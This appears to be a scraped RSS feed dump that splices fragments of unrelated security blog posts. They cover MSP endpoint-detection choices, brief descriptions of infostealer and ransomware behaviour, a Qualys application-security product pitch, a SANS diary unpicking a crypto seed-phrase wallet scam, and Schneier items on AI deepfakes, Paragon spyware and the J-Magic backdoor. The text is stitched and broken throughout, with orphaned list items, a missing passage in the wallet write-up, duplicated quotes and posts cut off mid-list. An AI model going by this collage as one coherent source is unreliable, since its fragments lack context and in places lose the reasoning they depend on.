&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/03/mdr-for-msps-navigating-edr-compatibility/" rel="nofollow"&gt;MDR for MSPs: Navigating EDR compatibility&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;When it comes to endpoint detection and response (EDR) compatibility within an MDR offering, managed service providers (MSPs) are weighing two key priorities: native EDR integration or the flexibility to support multiple solutions. According to a recent OpenText survey, opinions are split almost evenly. While 52% of MSPs view native compatibility as moderately or very important, 48% place greater value on flexibility.&lt;/p&gt;



&lt;p&gt;This divide reflects the unique demands MSPs face. On one hand, native compatibility ensures a tight integration. On the other, the ability to work seamlessly with various EDR tools is critical for MSPs managing diverse client environments. For MSPs managing a mix of EDR tools across their customer base, this adaptability can be the difference between a smooth operation and a logistical headache.&lt;/p&gt;



&lt;p&gt;In this blog, we’ll explore why flexibility in EDR compatibility is becoming a critical advantage for MSPs, how it ties into SIEM analysis, and actionable steps MSPs can take when evaluating MDR providers.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;The case for native EDR compatibility&lt;/h2&gt;



&lt;p&gt;For MSPs and their customers, native EDR compatibility can offer advantages, especially when targeting newer companies that have not yet established an EDR infrastructure.&lt;/p&gt;



&lt;p&gt;Here’s why:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Streamlined integration:&lt;/strong&gt;&lt;br /&gt;Native EDR solutions typically provide seamless integration with the MDR platform, simplifying deployment and reducing setup time. This can be particularly appealing for MSPs looking to quickly onboard new customers who do not yet have an EDR solution in place.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ease of use:&lt;/strong&gt;&lt;br /&gt;A native EDR integrated into the MDR platform provides MSPs with a consistent toolset, simplifying training for security teams and boosting overall efficiency and productivity.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;However, for MSPs serving established SMBs that already have an EDR solution, the dynamic changes. An MDR capable of working with any EDR solution often delivers greater flexibility and value by complementing the SMBs’ existing setups.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;When flexible EDR support wins&lt;/h2&gt;



&lt;p&gt;For MSPs, flexibility in EDR support provides a more strategic advantage. Managing security for well-established SMBs often means working within complex, diverse environments where a rigid “one-size-fits-all” approach simply doesn’t work. Here’s why flexible EDR support matters:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Avoiding &amp;#8220;rip and replace:&amp;#8221;&lt;/strong&gt;&lt;br /&gt;Many MSP prospects already have an EDR solution in place that they are comfortable with and that meets their needs. Moving to a new, native EDR can impose a “rip and replace” burden, leading to disruptions and additional costs that may not be acceptable to MSPs.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Supporting diverse client environments:&lt;/strong&gt;&lt;br /&gt;MSPs often manage a variety of EDR products across their customer base. The ability to support multiple EDRs means MSPs can tailor their MDR services to fit the unique needs of each client without forcing them to change their existing security infrastructure.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Future-proofing:&lt;/strong&gt;&lt;br /&gt;Flexibility allows MSPs to stay ahead of the curve by ensuring their MDR solution can integrate with emerging EDR tools. This adaptability is crucial in a rapidly evolving cybersecurity landscape.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;The MDR advantage—unifying EDR telemetry through SIEM&lt;/h2&gt;



&lt;p&gt;In a modern MDR solution, the SIEM platform serves as the backbone, ingesting security telemetry from across the customer environment. This includes feeds from firewalls, cloud services, identity providers, and—crucially—EDR solutions. The ability to support multiple EDR tools isn’t just about flexibility; it’s about leveraging the full power of SIEM to deliver more effective and unified threat detection and response.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Centralized visibility:&lt;/strong&gt;&lt;br /&gt;By aggregating telemetry from diverse EDRs and other security tools into a single SIEM platform, MSPs gain a holistic view of the customer’s security posture. This comprehensive perspective enables faster identification of threats and vulnerabilities across the environment.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Improved threat detection:&lt;/strong&gt;&lt;br /&gt;SIEM platforms excel at correlating data from multiple sources. By ingesting streams from EDRs alongside other security feeds, the MDR solution enhances its ability to detect sophisticated threats with greater accuracy and precision, reducing false positives and improving response times.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enhanced reporting and insights:&lt;/strong&gt;&lt;br /&gt;Unified telemetry within the SIEM allows MSPs to generate detailed, actionable reports that highlight trends, identify gaps, and demonstrate the value of their security services. These insights help MSPs guide their clients in making smarter security investments.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Actionable advice for MSPs&lt;/h2&gt;



&lt;p&gt;When choosing an MDR provider, MSPs should keep a few key factors in mind:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;EDR compatibility:&lt;/strong&gt;&lt;br /&gt;Ensure the MDR solution can seamlessly integrate with multiple EDR tools to support your diverse client environments.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;SIEM integration:&lt;/strong&gt;&lt;br /&gt;Look for MDR solutions that can unify EDR telemetry through a centralized SIEM platform.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scalability:&lt;/strong&gt;&lt;br /&gt;Choose an MDR provider that can scale with your business and offers the flexibility to adapt to evolving client needs and emerging cybersecurity challenges.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By prioritizing these factors, MSPs can provide their customers with advanced, efficient, and flexible security solutions that meet their unique needs.&lt;/p&gt;

&lt;li&gt;Xloader malware, a successor to Formbook known for stealing information from web browsers, email clients, and FTP applications, &lt;a href="https://www.zscaler.com/blogs/security-research/technical-analysis-xloader-versions-6-and-7-part-1"&gt;employs&lt;/a&gt; enhanced obfuscation and encryption techniques like runtime code encryption and NTDLL hook evasion. It establishes persistence by copying itself to specific directories, modifying Windows registry entries, and using process injection.&lt;/li&gt;

&lt;li&gt;A recently discovered ransomware called Windows Locker, first observed on GitHub in December 2024, &lt;a href="https://www.cyfirma.com/research/windows-locker-ransomware/"&gt;targets&lt;/a&gt; victims by encrypting files and modifying registry keys for persistence. It prevents standard recovery methods and uses AES encryption techniques to encrypt data. Additionally, Windows Locker deletes shadow copies, leaving users unable to retrieve manipulated files.&lt;/li&gt;
&lt;li&gt;A technical analysis of Arcus Media ransomware &lt;a href="https://www.halcyon.ai/blog/arcus-media-ransomware-displays-novel-process-targeting-selective-encryption-and-recovery-disruption"&gt;shows&lt;/a&gt; it elevates privileges using the ShellExecuteExW API without administrative access and maintains registry-based persistence. It halts critical processes like SQL servers and email clients via the CreateToolhelp32Snapshot API, encrypts files with the ChaCha20 cipher adding &amp;#8220;[Encrypted].Arcus&amp;#8221; to filenames, and hinders recovery by deleting shadow backups, disabling system recovery, and clearing event logs.&lt;/li&gt;

&lt;p&gt;Today, the modern attack surface has exploded, fueled by APIs that now &lt;a href="https://www.akamai.com/newsroom/press-release/state-of-the-internet-security-retail-attacks-and-api-traffic"&gt;drive 83% of all web traffic&lt;/a&gt;, powering critical integrations, microservices, and digital experiences. Security teams are left in the dark as developers introduce APIs at an exponential pace, creating blind spots. Organizations are fighting shadow APIs, misconfigured endpoints as well as operational complexity of fragmented tools that fail to deliver a unified picture of risk.&lt;/p&gt;



&lt;p&gt;This is where &lt;strong&gt;Qualys TotalAppSec&lt;/strong&gt; changes the game. By unifying web application scanning, API security, and web malware detection under one AI-powered solution, TotalAppSec equips organizations to measure, communicate, and eliminate risks across their entire application attack surface.&lt;/p&gt;



&lt;span id="more-37180"&gt;&lt;/span&gt;



&lt;div style="padding: 56.25% 0 0 0;"&gt;&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="web-apps-and-apis-the-expanding-attack-surface"&gt;Web Apps and APIs: The Expanding Attack Surface&lt;/h2&gt;



&lt;p&gt;In cybersecurity, risk is a moving target. While new-age technology drives innovation, it also expands the attack surface in ways that can be both quantified and strategically mitigated.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.verizon.com/business/resources/reports/dbir/"&gt;Web applications remain the top entry point for breaches&lt;/a&gt;&lt;strong&gt; &amp;#8211; 68%&lt;/strong&gt; involving third-party risks like the human element and &lt;strong&gt;32%&lt;/strong&gt; linked to ransomware, often delivered through compromised web apps and APIs. Adding to this complexity, APIs now dominate internet traffic, but their ubiquity makes them prime targets, as evident by countless breaches that exploited APIs.&lt;/p&gt;



&lt;p&gt;With the &lt;a href="https://www.ibm.com/reports/data-breach"&gt;global cost of a breach at $4.88 million&lt;/a&gt;, organizations face a critical challenge, underscoring the financial impact of failing to secure web applications and APIs. Compounded &lt;a href="https://www.verizon.com/about/news/2024-data-breach-investigations-report-vulnerability-exploitation-boom"&gt;by 55-day remediation delays&lt;/a&gt;, cybercriminals exploit this window of opportunity.&lt;/p&gt;



&lt;p&gt;As organizations adopt multi-cloud environments and embrace rapid development cycles, the question isn’t if cybercriminals will target their web apps and APIs—it’s when.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="top-challenges-faced-by-security-leaders"&gt;Top Challenges Faced by Security Leaders&lt;/h2&gt;



&lt;p&gt;Security leaders face a triad of challenges that undermine their ability to manage application risk effectively.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;1. Lack of Visibility into Unknown and Shadow Web Apps &amp;amp; APIs&lt;strong&gt;&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;The lack of visibility into shadow and forgotten APIs leaves organizations exposed to risks. With 300+ APIs per enterprise, many go undocumented, bypassing security protocols and exposing sensitive data. As Forrester highlights, without a comprehensive API inventory, you cannot defend what you cannot see—a critical challenge for modern application security.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;2. Fragmented and Siloed Security Testing Tools&lt;/h3&gt;



&lt;p&gt;Disparate tools like SAST, DAST, SCA, and API security solutions operate in silos, creating fragmented workflows and limited API coverage. They fail to assess runtime threats or underlying infrastructure vulnerabilities, leaving critical security gaps. Conflicting results from different security tools and false positives waste time, delaying response and leaving risks unaddressed for weeks or months.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;3. Overwhelming Vulnerabilities with No Clear Prioritization Strategy&lt;/h3&gt;



&lt;p&gt;Not all vulnerabilities are equal. Without context—how a vulnerability in one component impacts another—security teams mis-prioritize remediation. As a result, time is wasted on low-risk issues while high-risk threats remain unchecked, exposing organizations to potentially critical business disruptions amid an overwhelming volume of web app and API vulnerabilities.&lt;/p&gt;



&lt;p&gt;These challenges are more than operational headaches; they represent a fundamental misalignment between security workflows and the rapidly evolving threat landscape.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="introducing-qualys-totalappsec"&gt;Introducing Qualys TotalAppSec&lt;/h2&gt;



&lt;p&gt;Qualys TotalAppSec emerges as the definitive solution for unified application risk management. By combining comprehensive discovery, automated risk assessment, and remediation into a single, AI-powered solution, TotalAppSec enables organizations to proactively address risks across web applications and APIs while embedding security throughout the development lifecycle.&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;

This unified approach provides security teams with a comprehensive view of their web attack surface and a clear path to mitigate risks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Extensive coverage across diverse environments &amp;#8211; &lt;/strong&gt;Whether the web assets are on-premises, multi-cloud, containerized, or hosted in API gateways, TotalAppSec ensures complete visibility. Its ability to integrate with both native Qualys tools (e.g., VMDR, CSAM, EASM, TotalCloud) and third-party platforms (e.g., AWS, Azure, Mulesoft, APIgee) enables organizations to manage all web apps &amp;amp; APIs &amp;#8211; known and unknown, shadow and forgotten &amp;#8211; from a single view.&lt;/li&gt;
&lt;/ol&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/WAS-PR-3.png"&gt;&lt;img alt="" class="wp-image-37181" height="4596" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/WAS-PR-3.png" width="5859" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="qualys-totalappsec-in-action"&gt;Qualys TotalAppSec in Action&lt;/h2&gt;



&lt;p&gt;The power of &lt;strong&gt;Qualys TotalAppSec&lt;/strong&gt; lies in its ability to deliver actionable insights and streamlined workflows across three critical pillars: &lt;strong&gt;Discovery&lt;/strong&gt;, &lt;strong&gt;Risk Assessment&lt;/strong&gt;, and &lt;strong&gt;Response&lt;/strong&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Discover: Complete Visibility Across Your Application Ecosystem&lt;/h3&gt;



&lt;p&gt;TotalAppSec empowers organizations to achieve a comprehensive inventory of known, unknown, forgotten, and shadow web apps and APIs.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Comprehensive discovery &amp;#8211; &lt;/strong&gt;TotalAppSec identifies web applications and APIs across diverse environments, including on-prem, multi-cloud, API gateways, and containers. With native integrations into Qualys tools like VMDR, CSAM/EASM, and TotalCloud, as well as third-party platforms like AWS, Azure, Kubernetes, Mulesoft, and APIgee, organizations can gain full visibility into their attack surface.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image-5.png"&gt;&lt;img alt="" class="wp-image-37183" height="3240" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image-5.png" width="5760" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Detection of shadow APIs and forgotten web apps &amp;#8211;&lt;/strong&gt; Shadow APIs and forgotten applications pose significant risks, often flying under the radar of traditional tools. TotalAppSec automatically uncovers these hidden assets, bringing them into the fold for proactive monitoring.&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading"&gt;Risk Assessment: Accurate, Automated, and Unified&lt;/h3&gt;



&lt;p&gt;TotalAppSec delivers automated risk assessment that identifies and evaluates vulnerabilities in real time.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Automated security and compliance testing &lt;/strong&gt;&amp;#8211; TotalAppSec conducts automated security testing for web app and API vulnerabilities like OWASP Top 10 risks, OWASP API Top 10, PII &amp;amp; sensitive data exposures, injection attacks, rate limiting, authentication flaws, authorization issues, zero-day malware, and more. TotalAppSec performs both active and passive compliance monitoring to identify any drift or inconsistencies in API implementation and documentation in adherence to the OpenAPI Specification (OAS v3).&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Consolidated view of third-party tools &amp;#8211;&lt;/strong&gt; By consolidating findings from third-party manual PEN testing tools such as BurpSuite and Bugcrowd, TotalAppSec provides a single source of truth for risk assessment.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image-1.png"&gt;&lt;img alt="" class="wp-image-37184" height="1752" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image-1.png" width="3456" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading"&gt;Response: Prioritize and Remediate What Matters Most&lt;/h3&gt;



&lt;p&gt;TotalAppSec transforms reactive security into a proactive, business-aligned process by integrating automated prioritization and remediation directly into operational workflows.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;TruRisk&lt;sup&gt;TM&lt;/sup&gt; Scoring &amp;#8211;&lt;/strong&gt; By leveraging the Qualys TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; score, TotalAppSec prioritizes vulnerabilities based on asset criticality, exploitability, and business impact to focus remediation efforts where it matters most. By correlating risks across web apps, APIs, and infrastructure, TotalAppSec’s TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; score quantifies true application risk &amp;#8211; not just isolated vulnerabilities. Using 25+ threat intelligence feeds, it prioritizes high-impact attack chains, reducing MTTR and enabling risk-informed decisions that prevent cascading breaches, compliance failures, and operational disruptions.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/06-TruRisk-Score.png"&gt;&lt;img alt="" class="wp-image-37185" height="3092" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/06-TruRisk-Score.png" width="6016" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Integrated remediation workflows &amp;#8211;&lt;/strong&gt; TotalAppSec automates ticket creation and integrates seamlessly with tools like Jira and ServiceNow. Combined with direct integration into CI/CD pipelines like Azure DevOps, Jenkins, TeamCity, Bamboo, etc., developers receive actionable tasks assigned in real time to remediate vulnerabilities early in the software development lifecycle.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image-4.png"&gt;&lt;img alt="" class="wp-image-37186" height="3093" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image-4.png" width="6016" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading"&gt;Advanced AI Capabilities for Modern Application Security&lt;/h3&gt;



&lt;p&gt;As the threat landscape continues to evolve, traditional approaches to application security often fall short in addressing today’s sophisticated risks. To stay ahead, organizations need advanced capabilities that not only detect but also prioritize and mitigate risks efficiently. This is where Qualys TotalAppSec leads the charge. With its deep learning-based web malware detection and AI-powered Quick Scan, TotalAppSec redefines how security teams secure their application ecosystems with greater agility and precision.&lt;/p&gt;



&lt;p&gt;1. &lt;strong&gt;Deep learning-based web malware detection&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Modern malware threats evolve rapidly, often bypassing traditional signature-based detection methods. TotalAppSec addresses this challenge with its deep-learning algorithms and advanced AI models to identify both known and zero-day malware threats. By analyzing files using heuristic, behavioral, and reputational analysis techniques, TotalAppSec uncovers and identifies embedded malware that might otherwise remain hidden.&lt;/p&gt;



&lt;p&gt;What sets this approach apart is its ability to detect malicious patterns without relying on predefined signatures. Using a deep learning model trained on vast datasets, TotalAppSec generates unique &amp;#8220;neural fingerprints&amp;#8221; for each file, comparing them against patterns of known and emerging malware.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image3.png"&gt;&lt;img alt="" class="wp-image-37187" height="1752" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/TAS-Image3.png" width="3456" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;2. &lt;strong&gt;AI-powered quick scan&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;When time is of the essence, the AI-powered quick scan in TotalAppSec ensures that vulnerabilities are identified and prioritized without delaying critical development timelines. It uses deep learning to cluster vulnerabilities and narrow its focus on areas of greatest risk, &lt;strong&gt;delivering&lt;/strong&gt; &lt;strong&gt;96% detection accuracy&lt;/strong&gt; while &lt;strong&gt;reducing scan times by up to 80%&lt;/strong&gt;. By dynamically learning from scan results in real time, the system continually improves its efficiency, providing organizations with actionable insights faster than traditional scanning methods. With its ability to cluster vulnerabilities by similar characteristics and focus on high-risk areas, Quick Scan ensures that critical issues are addressed early in the software development lifecycle. This makes it an ideal tool for Shift-Left security practices, enabling teams to maintain velocity without compromising on security.&lt;/p&gt;

&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;h2 class="wp-block-heading" id="totalappsec-unifying-application-risk-for-a-complete-view-of-security-posture"&gt;TotalAppSec &amp;#8211; Unifying Application Risk for a Complete View of Security Posture&lt;/h2&gt;



&lt;p&gt;Security teams often struggle with incomplete risk assessments because application security is treated as a collection of independent layers &amp;#8211; web apps, APIs, and the infrastructure that supports them. However, attackers don’t think in silos. They chain vulnerabilities across these layers to maximize impact.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;So, what’s the real risk of an application?&lt;/em&gt; If you assess web app vulnerabilities separately from API risks and infrastructure exposures, you miss the compounding effect that turn a minor misconfiguration into a high-impact breach.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Take this example:&lt;/strong&gt; A publicly exposed API with weak authentication (&lt;strong&gt;API risk&lt;/strong&gt;) running an application vulnerable to an OWASP Top 10 issue (&lt;strong&gt;web app risk&lt;/strong&gt;) – both hosted on an unpatched server running outdated software (&lt;strong&gt;infrastructure risk&lt;/strong&gt;).&lt;/p&gt;



&lt;p&gt;Individually, each issue might rank as a moderate risk. But correlated together, it creates a cascading high-risk impact &amp;#8211; attackers can compromise the entire application stack, leading to data exfiltration, compliance failures, and operational downtime.&lt;/p&gt;



&lt;p&gt;This is what TotalAppSec quantifies. Instead of separate, incomplete risk scores, TotalAppSec delivers&lt;strong&gt; a single TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; score&lt;/strong&gt;—one that reflects the &lt;strong&gt;true business impact&lt;/strong&gt; of an application’s vulnerabilities.&lt;/p&gt;



&lt;p&gt;Security teams can prioritize remediation efforts based on correlated, high-risk scenarios, reducing MTTR (Mean Time to Remediate) and ensuring that critical applications receive immediate attention.&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p class="has-text-align-center"&gt;&lt;em&gt;If you can’t quantify risk across an entire application, you can’t effectively reduce it.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;TotalAppSec ensures security leaders aren’t reacting to individual alerts &amp;#8211; but making data-driven, risk-informed decisions to protect their most critical assets.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250203-081829.png" style="width: 669px; height: 227px;" /&gt;&lt;/p&gt;

&lt;p&gt;It was clear to us that this was a scam, but it wasn't clear to us how it worked.&lt;/p&gt;

&lt;p&gt;The &lt;a href="https://en.wikipedia.org/wiki/Cryptocurrency_wallet#Seed_phrases"&gt;seed phrase&lt;/a&gt; allows you to derive the private keys of the wallets, and gives you full control over the wallet. And as security professionals, we know you must never share private keys. So the scammer wants us to think that they shared their private keys without understanding the risk. And thus creating a (false) opportunity for dishonest people wanting to appropriate the content of the wallet. Because you have the private keys, you can move the funds out of the wallet to your own wallet.&lt;/p&gt;

&lt;p&gt;So one could install wallet software and use the private key to control the wallet.&lt;/p&gt;

&lt;p&gt;But let's do this a bit differently.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://iancoleman.io/bip39/"&gt;Mnemonic Code Converter&lt;/a&gt; is an online/offline HTML page that takes seed phrases and converts them to a seed (&lt;a href="https://en.bitcoin.it/wiki/BIP_0039"&gt;BIP39&lt;/a&gt;) and addresses (&lt;a href="https://en.bitcoin.it/wiki/BIP_0044"&gt;BIP44&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Doing this for the scammer's seed phrase give this:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250203-083932.png" style="width: 1209px; height: 967px;" /&gt;&lt;/p&gt;

&lt;p&gt;I had to select a coin to derive the addresses. USDT (a &lt;a href="https://en.wikipedia.org/wiki/Stablecoin"&gt;stablecoin&lt;/a&gt; for the US Dollar) is mentioned in the scam comment, but it's not an option in this page. I did some research, and discovered that USDT is a token that can be exchanged on different networks. The most popular network is Tron, and that coin is TRX. So let's try coin TRX:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250203-084317.png" style="width: 1581px; height: 967px;" /&gt;&lt;/p&gt;

&lt;p&gt;That address is indeed active on the Tron blockchain :&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250203-084637.png" style="width: 1421px; height: 757px;" /&gt;&lt;/p&gt;

&lt;p&gt;This wallet contains $5000+, mostly in USDT, and a small bit in TRX. It's a real wallet, and it contains real assets. So what's the scam, why hasn't this money been moved out of the wallet yet?&lt;/p&gt;

/&gt;&lt;/p&gt;

&lt;p&gt;This means that this is a multi-signature wallet (it has not one private key, like classic wallets, but it has multiple private keys), and that the published seed phrase doesn't give you control over the wallet. To move money out of the wallet, you need the private key of the address mentioned in the permissions (TGk...).&lt;/p&gt;

&lt;p&gt;So that's why there is still $5000+ in this wallet.&lt;/p&gt;

&lt;p&gt;Second thing, to move the $5000+ USDT tokens out of the wallet, you need to pay a fee with TRX tokens. And the amount of TRX tokens in the wallet is not sufficient to pay the fee. Thus you can't move the USDT tokens to your own wallet. And it's here that dishonest people get scammed.&lt;/p&gt;

&lt;p&gt;They will move some of their own TRX into the wallet, and then use that to pay the fee to try to transfer the USDT to their own wallet (it won't work).&lt;/p&gt;

&lt;p&gt;We can see this happening in the transaction history of this wallet:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250203-090029.png" style="width: 1385px; height: 763px;" /&gt;&lt;/p&gt;

&lt;p&gt;Small amounts of TRX are transfered to this wallet.&lt;/p&gt;

&lt;p&gt;So this scam is targetting versed cryptocurrency users: you need to know that TRX coins are necessary to move USDT tokens out of a TRX wallet (I didn't know this).&lt;/p&gt;

&lt;p&gt;But why would experienced cryptocurrency users not notice that this is a multisig wallet and that the seed phrase doesn't give them control over the wallet?&lt;/p&gt;

&lt;p&gt;Maybe the explanation lies in the fact that the OKX wallet (mentioned in the scam comment) doesn't display that information (alledgedly, there are wallet applications that do flag multisig wallets).&lt;/p&gt;

&lt;p&gt;After moving some TRX coins into the wallet, the transfer of USDT tokens is still not possible because of permissions, and the scam victims can't recover their TRX coins, because that transfer is also not possible because of permissions.&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I'm not well versed in cryptocurrency, please post a comment if you want to correct or complement things I explain here, or if you have different explanations. I used the following resources for my research:&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We find that (1) half of AI use isn&amp;#8217;t deceptive, (2) deceptive content produced using AI is nevertheless cheap to replicate &lt;em&gt;without&lt;/em&gt; AI, and (3) focusing on the demand for misinformation rather than the supply is a much more effective way to diagnose problems and identify interventions...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;Interesting &lt;a href="https://knightcolumbia.org/blog/we-looked-at-78-election-deepfakes-political-misinformation-is-not-an-ai-problem"&gt;analysis&lt;/a&gt;:&lt;/p&gt;

In each case, we identified what AI was used for and estimated the cost of creating similar content without AI.&lt;/p&gt;
&lt;p&gt;We find that (1) half of AI use isn&amp;#8217;t deceptive, (2) deceptive content produced using AI is nevertheless cheap to replicate &lt;em&gt;without&lt;/em&gt; AI, and (3) focusing on the demand for misinformation rather than the supply is a much more effective way to diagnose problems and identify interventions.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This tracks with my analysis. People share as a form of social signaling. I send you a meme/article/clipping/photo to show that we are on the same team. Whether it is true, or misinformation, or actual propaganda, is of secondary importance. Sometimes it&amp;#8217;s completely irrelevant. This is why fact checking doesn&amp;#8217;t work. This is why &amp;#8220;cheap fakes&amp;#8221;&amp;#8212;obviously fake photos and videos&amp;#8212;are effective. This is why, as the authors of that analysis said, the demand side is the real problem.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=69865</guid><category>Uncategorized</category><category>AI</category><category>deception</category><category>deepfake</category></item><item><title>Journalists and Civil Society Members Using WhatsApp Targeted by Paragon Spyware</title><link>https://www.schneier.com/blog/archives/2025/02/journalists-and-civil-society-members-using-whatsapp-targeted-by-paragon-spyware.html</link><description>&lt;p&gt;This is yet another story of commercial spyware being &lt;a href="https://www.theguardian.com/technology/2025/jan/31/whatsapp-israel-spyware"&gt;used against&lt;/a&gt; journalists and civil society members.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;When threat actors use backdoor malware to gain access to a network, they want to make sure all their hard work can&amp;#8217;t be leveraged by competing groups or detected by defenders. One countermeasure is to equip the backdoor with a passive agent that remains dormant until it receives what&amp;#8217;s known in the business as a &amp;#8220;magic packet.&amp;#8221; On Thursday, researchers revealed that a never-before-seen backdoor that quietly took hold of dozens of enterprise VPNs running Juniper Network&amp;#8217;s Junos OS has been doing just that.&lt;/p&gt;
&lt;p&gt;J-Magic, the tracking name for the backdoor, goes one step further to prevent unauthorized access. After receiving a magic packet hidden in the normal flow of TCP traffic, it relays a challenge to the device that sent it. The challenge comes in the form of a string of text that&amp;#8217;s encrypted using the public portion of an RSA key. The initiating party must then respond with the corresponding plaintext, proving it has access to the secret key.&lt;/p&gt;
&lt;p&gt;The lightweight backdoor is also notable because it resided only in memory, a trait that makes detection harder for defenders. The combination prompted researchers at Lumin Technology&amp;#8217;s Black Lotus Lab to sit up and take notice.&lt;/p&gt;
&lt;p&gt;[&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The researchers found J-Magic on &lt;a href="https://www.virustotal.com/gui/home/upload"&gt;VirusTotal&lt;/a&gt; and determined that it had run inside the networks of 36 organizations. They still don&amp;#8217;t know how the backdoor got installed.&lt;/p&gt;&lt;/blockquote&gt;

&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



